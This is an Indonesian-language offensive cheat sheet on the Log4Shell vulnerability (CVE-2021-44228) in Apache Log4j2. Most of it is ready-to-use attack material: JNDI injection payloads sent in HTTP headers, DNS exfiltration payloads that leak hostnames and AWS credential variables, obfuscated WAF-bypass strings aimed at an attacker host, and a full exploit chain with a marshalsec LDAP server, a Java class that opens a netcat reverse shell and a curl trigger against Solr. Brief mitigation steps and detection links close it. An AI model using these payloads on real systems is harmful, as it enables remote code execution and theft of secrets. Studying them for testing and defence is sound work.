# Log4J
type: #offensive #deserialization  #rce 
techniques: #rce #reverseshell #exfiltration 
target: #log4j

## Log4Shell (CVE-2021-44228)
Apache Log4j2 versi 1.0-beta9 s/d 2.15.0 (kecuali 2.12.2, 2.12.3, dan 2.3.1)

Log4Shell melakukan lookup seperti system, environment variable, dan Java, namun JNDI membuat ini semakin buruk. Vulnerability ini berbahaya karena dapat menginjeksikan payload JNDI di dalam log dan dapat mengeksekusi code.
```sh
# basic: akses site lain, gunakan netcat untuk recon atau 
${jndi:ldap://site-tujuan.com}

# recon menggunakan http
${jndi:http://site-tujuan.com}

# testing dengan membuat lokasi eror pada header
curl site-tujuan.com -H 'User-Agent: ${jndi:ldap://arbitrary-website.com/akakss}'
curl site-tujuan.com -H 'X-Api-Version: ${jndi:rmi://arbitrary-website.com/akakss}'
```

Header yang dapat dicek
- User-Agent
- X-Api-Version
- X-Forwarded-For
- Tempat lain yang masuk ke dalam log

> Untuk testing pada Log4J versi 2.15 membutuhkan localhost check bypass:
> `${jndi:ldap://127.0.0.1#...}`
> `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`

### Data Exfiltration
Data exfiltration dapat dilakukan dengan membuat dns request. Informasi seperti environment variabel dapat diambil. Beberapa metode dan tools untuk data exfiltration adalah
```sh
# canary tokens
${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}

# burp collaborator
${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}

# interactsh
${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}

# dnslog
${jndi:ldap://2j4ayo.dnslog.cn}

# huntress
${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}
```

```sh
# dns request berisi informasi sensitif.
${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}

# Potential attack
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}
```

### Bypass WAF
```sh
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

### Exploitation
#### Using Java marshalling libraries 
Buka http://mirrors.rootpei.com/jdk/ download Java versi 1.8.0_181 `jdk-8u181-linux-x64.tar.gz`. Kemudian konfigurasi versi Java menjadi 1.8.0_181
```sh
sudo mkdir /usr/lib/jvm 

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

java -version
```

Instalasi marshalsec
```sh
git clone https://github.com/mbechler/marshalsec.git

# install maven and build the code
sudo apt install maven
mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

Buat Java reverse shell `Exploit.java`
```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 1234");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compile java dan eksploitasi
```sh
# Compile dengan versi java 1.8 dan kompatibility java 1.8
javac Exploit.java -source 8 -target 8
# atau
javac Exploit.java

# buka http server temporer pada tab lain
python3 -m http.server

# buka netcat listener pada tab lain
nc -lnvp 1234

#trigger eksploitasi
curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
```

### Mitigasi
Deteksi vulnerable version:
`find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"`

Update Log4J ke versi 2.16.0 JNDI tidak diperbolehkan di dalam log atau:
- Buka `/etc/default/solr.in.sh` dan tambahkan `SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`
- Kemudian restart service `sudo /etc/init.d/solr restart`


### Closing
#### Log4j testing:
Deteksi kerentanan servermu di https://log4shell.huntress.com/
Coba eksploitasi pada: 
https://github.com/leonjza/log4jpwn
https://tryhackme.com/room/solar jika free user pakailah VPN.
https://github.com/christophetd/log4shell-vulnerable-app spring boot vulnerable app


#### Source
https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

Below are snippets that might help either effort:
-   [https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) (local, based off hashes of log4j JAR files)
-   [https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d) (local, based off hashes of log4j CLASS files)
-   [https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228) (listing of vulnerable JAR and CLASS hashes)
-   [https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) (local, hunting for vulnerable log4j packages in PowerShell)
-   [https://github.com/darkarnium/CVE-2021-44228](https://github.com/darkarnium/CVE-2021-44228) (local, YARA rules)

As a reminder, a massive resource is available here: 
[https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)

